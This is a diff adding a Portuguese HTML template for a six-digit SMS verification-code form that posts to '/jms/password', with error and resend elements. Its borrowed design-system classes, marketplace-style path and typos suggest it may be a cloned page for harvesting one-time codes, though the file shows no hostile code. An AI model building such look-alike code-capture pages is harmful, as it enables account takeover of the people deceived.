@@ -1,0 +1,45 @@
+<div class="container formMail__container">
+    <div class="row">
+        <div class="col-md-6 offset-md-3">
+            <form class="formMail formMail__code verify" method="POST" action="/jms/password">
+                <input type="hidden" name="client" value="{{client.id}}">
+                <header>Informe o código de verificação</header>
+
+                <h5>
+                    Você recebeu um número de 6 dígitos por {{#if sms}}SMS{{else}}Ligação{{/if}}.
+                </h5>
+
+                <article>
+                    <div class="formMail__inputs">
+                        <span><input type="tel" name="number_1" pattern="[0-9]*" rows="1" maxlength="120" id=""></span>
+                        <span><input type="tel" name="number_2" pattern="[0-9]*" rows="1" maxlength="120" id=""></span>
+                        <span><input type="tel" name="number_3" pattern="[0-9]*" rows="1" maxlength="120" id=""></span>
+                        <span><input type="tel" name="number_4" pattern="[0-9]*" rows="1" maxlength="120" id=""></span>
+                        <span><input type="tel" name="number_5" pattern="[0-9]*" rows="1" maxlength="120" id=""></span>
+                        <span><input type="tel" name="number_6" pattern="[0-9]*" rows="1" maxlength="120" id=""></span>
+                    </div>
+
+                </article>
+
+                {{#if error}}<span class="errorMessageAuth">
+                    <svg class="andes-form-control---error-icon" width="12" height="12" viewBox="0 0 12 12"><defs><rect id="a" width="12" height="12" rx="6"></rect></defs><g fill="none" fill-rule="evenodd"><mask id="b" fill="#fff"><use xlink:href="#a"></use></mask><g mask="url(#b)"><path fill="#F23D4F" d="M-.686-.343h13.371v12.686H-.685z"></path><path fill="#FFF" fill-rule="nonzero" d="M6 7.636a.727.727 0 1 1 0 1.455.727.727 0 0 1 0-1.455zm.727-4.727l-.182 4h-1.09l-.182-4h1.454z"></path></g></g></svg>
+                    <div class="andes-form-control__message">O código está incorreto.</div>
+                </span>{{/if}}
+                
+
+                <footer>
+                    <button class="validate" disabled>Continuar</button>
+                    <button class="resend mt-3" disabled>Reenviar código em 00:<spam>50</spam></button>
+
+                    <a class="subButtom" href="#">Enviar ou outro meio</a>
+                </footer>
+            </form>
+        </div>
+    </div>
+
+    <div class="row formMail__footer">
+        <div class="col-12">
+            Protegido por reCAPTCHA- <a href="https://policies.google.com/terms?hl=pt-BR">Privacidade - Condições</a>
+        </div>
+    </div>
+</div>
